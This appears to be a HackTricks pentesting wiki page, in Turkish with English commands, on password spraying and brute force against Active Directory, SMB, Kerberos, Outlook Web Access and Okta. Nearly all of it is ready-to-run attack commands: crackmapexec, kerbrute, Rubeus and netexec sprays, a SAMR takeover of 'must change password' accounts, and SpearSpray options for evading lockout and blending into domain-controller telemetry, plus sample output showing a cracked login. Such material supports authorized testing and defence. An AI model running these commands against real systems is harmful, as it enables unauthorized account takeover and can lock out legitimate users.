# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

Birkaç **geçerli kullanıcı adı** bulduktan sonra, keşfedilen her kullanıcı için en **yaygın parolaları** deneyebilirsiniz (ortamın parola politikasını göz önünde bulundurun).\
**varsayılan** olarak **minimum** **parola** **uzunluğu** **7**'dir.

Yaygın kullanıcı adları listeleri de faydalı olabilir: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

Unutmayın: **birkaç yanlış parola denerseniz bazı hesaplar kilitlenebilir** (varsayılan olarak 10'dan fazla).

### Parola politikası edinme

Eğer bazı kullanıcı kimlik bilgilerine veya domain user olarak bir shell'e sahipseniz, **parola politikasını şu şekilde alabilirsiniz**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Exploitation — Linux'ten (veya tümü)

- Kullanarak **crackmapexec:**
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- [**kerbrute**](https://github.com/ropnop/kerbrute) kullanarak (Go)
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(hesap kilitlenmelerini önlemek için deneme sayısını belirtebilirsiniz):**_
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) kullanımı (python) - TAVSİYE EDİLMEZ, BAZEN ÇALIŞMAZ
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- Metasploit'in `scanner/smb/smb_login` modülü ile:

![](<../../images/image (745).png>)

- **rpcclient** kullanılarak:
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### Windows'tan

- brute module içeren [Rubeus](https://github.com/Zer1t0/Rubeus) sürümü ile:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- İle [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Varsayılan olarak etki alanından kullanıcılar oluşturabilir ve etki alanından parola politikasını alarak denemeleri buna göre sınırlar):
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- İle [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
```
Invoke-SprayEmptyPassword
```
### "Password must change at next logon" Hesaplarını Belirleme ve Ele Geçirme (SAMR)

Düşük-gürültülü bir teknik, benign/empty password ile spray yapıp STATUS_PASSWORD_MUST_CHANGE döndüren hesapları yakalamaktır; bu, parolanın zorla süresinin dolduğunu ve eski parolayı bilmeden değiştirilebileceğini gösterir.

İş akışı:
- Kullanıcıları enumerate edin (RID brute via SAMR) ve hedef listesini oluşturun:

{{#ref}}
../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
{{#endref}}
```bash
# NetExec (null/guest) + RID brute to harvest users
netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
```
- Spray boş password kullan ve hitslerde devam et; next logon'da değiştirmek zorunda olan hesapları ele geçir:
```bash
# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
```
- Her hit için, NetExec’s modülü ile SAMR üzerinden parolayı değiştirin ("must change" ayarı etkin olduğunda eski parola gerekmez):
```bash
# Strong complexity to satisfy policy
env NEWPASS='P@ssw0rd!2025#' ; \
netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"

# Validate and retrieve domain password policy with the new creds
netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
```
Operasyonel notlar:
- Sunucu saatinizin Kerberos tabanlı işlemlerden önce DC ile senkronize olduğundan emin olun: `sudo ntpdate <dc_fqdn>`.
- Bazı modüllerde (ör. RDP/WinRM), (Pwn3d!) olmayan bir [+] işareti, creds'in geçerli olduğunu ancak hesabın etkileşimli oturum açma haklarına sahip olmadığını gösterir.

## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### Kerberos pre-auth spraying with LDAP targeting and PSO-aware throttling (SpearSpray)

Kerberos pre-auth–based spraying, SMB/NTLM/LDAP bind denemelerine kıyasla gürültüyü azaltır ve AD hesap kilitleme politikalarıyla daha iyi uyum sağlar. SpearSpray, LDAP-driven targeting, pattern engine ve policy awareness (domain policy + PSOs + badPwdCount buffer) ile hassas ve güvenli şekilde spray yapar. Ayrıca Neo4j içinde ele geçirilmiş principal'ları BloodHound pathing için etiketleyebilir.

Key ideas:
- LDAP ile kullanıcı keşfi; paging ve LDAPS desteği ile, isteğe bağlı olarak custom LDAP filtreleri kullanılabilir.
- Domain lockout policy + PSO-aware filtering ile yapılandırılabilir bir deneme tamponu (threshold) bırakmak ve kullanıcıların kilitlenmesini önlemek.
- Kerberos pre-auth validation, hızlı gssapi bindings kullanılarak (DCs üzerinde 4625 yerine 4768/4771 oluşturur).
- Pattern-based, kullanıcı başına parola oluşturma; isimler ve her kullanıcının pwdLastSet'inden türetilen zamansal değerler gibi değişkenler kullanılır.
- Throughput kontrolü threads, jitter ve max requests per second ile sağlanır.
- Opsiyonel Neo4j entegrasyonu ile ele geçirilen kullanıcılar BloodHound için işaretlenebilir.

Basic usage and discovery:
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
Hedefleme ve desen kontrolü:
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
Gizlilik ve güvenlik kontrolleri:
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Neo4j/BloodHound zenginleştirme:
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
Pattern sistemi genel bakış (patterns.txt):
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
Kullanılabilir değişkenler şunlardır:
- {name}, {samaccountname}
- Her kullanıcının pwdLastSet (veya whenCreated) alanından türetilen zamanla ilgili: {year}, {short_year}, {month_number}, {month_en}, {season_en}
- Kompozisyon yardımcıları ve organizasyon tokeni: {separator}, {suffix}, {extra}

Operasyonel notlar:
- En yetkili badPwdCount ve politika ile ilgili bilgileri okumak için PDC-emulator'a -dc ile sorgu yapmayı tercih edin.
- badPwdCount sıfırlamaları gözlem penceresinden sonraki bir sonraki denemede tetiklenir; güvende kalmak için eşik ve zamanlamayı kullanın.
- Kerberos pre-auth denemeleri DC telemetrisinde 4768/4771 olarak görünür; karışmak için jitter ve rate-limiting kullanın.

> İpucu: SpearSpray’s default LDAP page size is 200; adjust with -lps as needed.

## Outlook Web Access

p**assword spraying outlook** için birden çok araç vardır.

- With [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
- with [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
- With [Ruler](https://github.com/sensepost/ruler) (güvenilir!)
- With [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
- With [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)

Bu araçların herhangi birini kullanmak için bir kullanıcı listesine ve spray yapmak için bir password / küçük bir password listesine ihtiyacınız var.
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## Referanslar

- [https://github.com/sikumy/spearspray](https://github.com/sikumy/spearspray)
- [https://github.com/TarlogicSecurity/kerbrute](https://github.com/TarlogicSecurity/kerbrute)
- [https://github.com/Greenwolf/Spray](https://github.com/Greenwolf/Spray)
- [https://github.com/Hackndo/sprayhound](https://github.com/Hackndo/sprayhound)
- [https://github.com/login-securite/conpass](https://github.com/login-securite/conpass)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
- [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
- [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)


{{#include ../../banners/hacktricks-training.md}}
